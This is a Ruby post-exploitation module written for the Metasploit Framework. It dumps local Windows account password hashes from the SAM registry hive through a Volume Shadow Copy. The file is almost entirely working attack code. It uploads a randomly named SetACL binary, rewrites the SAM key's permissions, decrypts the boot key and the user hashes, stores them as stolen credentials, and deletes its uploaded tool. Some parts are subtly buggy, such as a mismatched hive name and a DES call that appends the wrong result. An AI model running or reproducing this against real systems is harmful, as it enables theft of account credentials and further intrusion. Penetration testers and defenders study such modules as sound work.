##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class MetasploitModule < Msf::Post

	include Msf::Auxiliary::Report
	include Msf::Post::Windows::Registry
	include Msf::Post::Common
	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Local User Account Password Hashes (Registry) using VSS',
			'Description'   => %q{
					This module will dump the local user accounts from the SAM database using the
					registry using Windows Volume Shadow Copy service. This is an alternative for
					Windows Vista, 7 and 2008 where administrator token is available but systme
					privileges to dump hashes are not. SetACL from http://helgeklein.com/ required.
				},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'hdm', 'Carlos Perez carlos_perez[at]darkoperator.com' ],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		# Constants for SAM decryption
		@sam_lmpass   = "LMPASSWORD\x00"
		@sam_ntpass   = "NTPASSWORD\x00"
		@sam_qwerty   = "!@\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
		@sam_numeric  = "0123456789012345678901234567890123456789\x00"
		@sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
		@sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")

		@des_odd_parity = [
			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
			32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
			49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
			64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
			81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
			97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
			112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
			128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
			145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
			161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
			176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
			193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
			208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
			224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
			241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
		]

	end

	def run
		begin

			# Make sure than a module error did not load them by mistake
			registry_unloadkey("HKLM\\shdsys")
			registry_unloadkey("HKLM\\shdsam")
			
			sysdrv = client.fs.file.expand_path("%SystemDrive%")
			vs_path = create_shadow(sysdrv)
			print_status("Created Volume Shadow Copy in #{vs_path}")
			sam_loaded = registry_loadkey("HKLM\\shdsam","#{vs_path}\\WINDOWS\\system32\\config\\SAM")
			print_status("Setting proper permissions on loaded SAM key")
			
			# upload subinacls and ajust permissions on key to be able to read the SAM Key
			if sysinfo['OS'] =~ /Windows 2008|7|Vista/
				print_status("Uploading file SetACL")
				on_trg = upload_subinacls
				if not on_trg.empty?
					# Changing permission on loaded SAM Registry key
					print_status("Executing command to change permissions on SAM key")
					exec_results = cmd_exec("cmd","/c #{on_trg} -on \"HKEY_LOCAL_MACHINE\\shdsam\" -ot reg -actn ace -ace \"n:Administrators;p:full;i:so;m:set\" -actn setprot -op \"dacl:np\" -actn clear -clr \"dacl\" -actn rstchldrn -rst \"dacl\"")
					vprint_status(exec_results)
					
					# Removing file on target
					print_status("Deleting #{on_trg}")
					session.fs.file.rm(on_trg)
				end
			end
			sys_loaded = registry_loadkey("HKLM\\shdsys","#{vs_path}\\WINDOWS\\system32\\config\\system")
			if sys_loaded and sam_loaded
				print_status("Obtaining the boot key...")
				bootkey  = capture_boot_key

				print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
				hbootkey = capture_hboot_key(bootkey)

				print_status("Obtaining the user list and keys...")
				users    = capture_user_keys

				print_status("Decrypting user keys...")
				users    = decrypt_user_keys(hbootkey, users)

				print_status("Unloading registry hives")
				registry_unloadkey("HKLM\\shdsys")
				registry_unloadkey("HKLM\\shdsam")

				print_status("Dumping password hashes...")
				print_line()
				print_line()
				users.keys.sort{|a,b| a<=>b}.each do |rid|
					hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
					report_auth_info(
						:host  => session.sock.peerhost,
						:port  => 445,
						:sname => 'smb',
						:user  => users[rid][:Name],
						:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
						:type  => "smb_hash"
					)
					print_line hashstring
				end
				print_line()
				print_line()
			else
				print_error("Could not load registry hive")
			end
		rescue ::Interrupt
			raise $!
		rescue ::Rex::Post::Meterpreter::RequestError => e
			print_error("Meterpreter Exception: #{e.class} #{e}")
			print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")

		end

	end

	#-----------------------------------------------------------------------------------------------
	def capture_boot_key
		bootkey = ""
		basekey = "shdsys\\ControlSet001\\Control\\Lsa"
		%W{JD Skew1 GBG Data}.each do |k|
			ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
			return nil if not ok
			bootkey << [ok.query_class.to_i(16)].pack("V")
			ok.close
		end

		keybytes    = bootkey.unpack("C*")
		descrambled = ""
	#	descrambler = [ 0x08, 0x05, 0x04, 0x02, 0x0b, 0x09, 0x0d, 0x03, 0x00, 0x06, 0x01, 0x0c, 0x0e, 0x0a, 0x0f, 0x07 ]
		descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]

		0.upto(keybytes.length-1) do |x|
			descrambled << [ keybytes[ descrambler[x] ] ].pack("C")
		end


		descrambled
	end

	#-----------------------------------------------------------------------------------------------
	def capture_hboot_key(bootkey)
		ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shdsam\\SAM\\Domains\\Account", KEY_READ)
		return if not ok
		vf = ok.query_value("F")
		return if not vf
		vf = vf.data
		ok.close

		hash = Digest::MD5.new
		hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)

		rc4 = OpenSSL::Cipher::Cipher.new("rc4")
		rc4.key = hash.digest
		hbootkey  = rc4.update(vf[0x80, 32])
		hbootkey << rc4.final
		return hbootkey
	end

	#-----------------------------------------------------------------------------------------------
	def capture_user_keys
		users = {}
		ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shdsam\\SAM\\Domains\\Account\\Users", KEY_READ)
		return if not ok

		ok.enum_key.each do |usr|
			uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shdsam\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
			next if usr == 'Names'
			users[usr.to_i(16)] ||={}
			users[usr.to_i(16)][:F] = uk.query_value("F").data
			users[usr.to_i(16)][:V] = uk.query_value("V").data
			uk.close
		end
		ok.close

		ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shd\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
		ok.enum_key.each do |usr|
			uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "shd\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
			r = uk.query_value("")
			rid = r.type
			users[rid] ||= {}
			users[rid][:Name] = usr
			uk.close
		end
		ok.close
		users
	end

	#-----------------------------------------------------------------------------------------------
	def decrypt_user_keys(hbootkey, users)
		users.each_key do |rid|
			user = users[rid]

			hashlm_off = nil
			hashnt_off = nil
			hashlm_enc = nil
			hashnt_enc = nil

			hoff = user[:V][0x9c, 4].unpack("V")[0] + 0xcc

			# Lanman and NTLM hash available
			if(hoff + 0x28 < user[:V].length)
				hashlm_off = hoff +  4
				hashnt_off = hoff + 24
				hashlm_enc = user[:V][hashlm_off, 16]
				hashnt_enc = user[:V][hashnt_off, 16]
			# No stored lanman hash
			elsif (hoff + 0x14 < user[:V].length)
				hashnt_off = hoff + 8
				hashnt_enc = user[:V][hashnt_off, 16]
				hashlm_enc = ""
			# No stored hashes at all
			else
				hashnt_enc = hashlm_enc = ""
			end
			user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)
			user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)
		end

		users
	end

	#-----------------------------------------------------------------------------------------------
	def convert_des_56_to_64(kstr)
		key = []
		str = kstr.unpack("C*")

		key[0] = str[0] >> 1
		key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
		key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
		key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
		key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
		key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
		key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
		key[7] = str[6] & 0x7F

		0.upto(7) do |i|
			key[i] = ( key[i] << 1)
			key[i] = @des_odd_parity[key[i]]
		end

		key.pack("C*")
	end

	def rid_to_key(rid)

		s1 = [rid].pack("V")
		s1 << s1[0,3]

		s2b = [rid].pack("V").unpack("C4")
		s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack("C4")
		s2 << s2[0,3]

		[convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
	end

	#-----------------------------------------------------------------------------------------------
	def decrypt_user_hash(rid, hbootkey, enchash, pass)

		if(enchash.empty?)
			case pass
			when @sam_lmpass
				return @sam_empty_lm
			when @sam_ntpass
				return @sam_empty_nt
			end
			return ""
		end

		des_k1, des_k2 = rid_to_key(rid)

		d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
		d1.padding = 0
		d1.key = des_k1

		d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
		d2.padding = 0
		d2.key = des_k2

		md5 = Digest::MD5.new
		md5.update(hbootkey[0,16] + [rid].pack("V") + pass)

		rc4 = OpenSSL::Cipher::Cipher.new('rc4')
		rc4.key = md5.digest
		okey = rc4.update(enchash)

		d1o  = d1.decrypt.update(okey[0,8])
		d1o << d1.final

		d2o  = d2.decrypt.update(okey[8,8])
		d1o << d2.final
		d1o + d2o
	end

	# Method for creating a volume shadow copy
	#-----------------------------------------------------------------------------------------------
	def create_shadow(sysdrv)
		vs_path = ""
		print_status("Creating volume shadow copy for drive #{sysdrv}")
		if sysinfo['OS'] =~ /Windows 7|Vista|XP/
			shadow = wmicexec("shadowcopy call create Context=\"ClientAccessible\" Volume=\"#{sysdrv}\\\"")
			if shadow =~ /success/
				vs_id = shadow.scan(/ShadowID = "(\S*)";/)[0].join
				cmd_results = cmd_exec("vssadmin","list shadows /Shadow=#{vs_id}",15)
				vs_path = cmd_results.scan(/Shadow Copy Volume: (\S*)/)[0].join
			end
		else
			cmd_results = cmd_exec("vssadmin","create shadow /for=#{sysdrv.strip}",15)
			if cmd_results =~ /Successfully/
				print_good("Creation of volume shadow successful")
				vs_path = cmd_results.scan(/Shadow Copy Volume Name: (\S*)/)[0].join
			end
		end
		return vs_path
	end

	# Method for execution of wmic commands given the options to the command
	#-----------------------------------------------------------------------------------------------
	def wmicexec(wmiccmd)
		tmpout = ''
		session.response_timeout=120
		begin
			tmp = session.fs.file.expand_path("%TEMP%")
			wmicfl = tmp + "\\"+ sprintf("%.5d",rand(100000))
			vprint_status "running command wmic #{wmiccmd}"
			r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmiccmd}", nil, {'Hidden' => true})
			sleep(2)
			#Making sure that wmic finishes before executing next wmic command
			prog2check = "wmic.exe"
			found = 0
			while found == 0
				session.sys.process.get_processes().each do |x|
					found =1
					if prog2check == (x['name'].downcase)
						sleep(0.5)
						found = 0
					end
				end
			end
			r.close

			# Read the output file of the wmic commands, type is used because wmic adds some special
			# chars to text files.
			tmpout = cmd_exec("cmd","/c type #{wmicfl}")

		rescue ::Exception => e
			print_status("Error running WMIC commands: #{e.class} #{e}")
		end
		# We delete the file with the wmic command output.
		c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
		c.close
		return tmpout
	end
	
	# Upload subinacls
	#-----------------------------------------------------------------------------------------------
	def upload_subinacls
		path_on_target = ""
		tmpdir = session.fs.file.expand_path("%TEMP%")
		
		# randomize the exe name
		tempexe_name = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

		# path to the subinacl binary
		path = ::File.join(Msf::Config.install_root, "data", "post","SetACL.exe")
		
		if ::File.exists?(path)
			session.fs.file.upload_file("%TEMP%\\"+tempexe_name, path)
			sleep(2)
			path_on_target = "#{tmpdir}\\"+tempexe_name
			print_status("Executable uploaded")
		else
			print_error("setacl in not in your data folder")
			print_error("Download and place the SetACL.exe in")
			print_error(path)
			print_error("Download from http://helgeklein.com/")
		end
		
		return path_on_target
	end
end

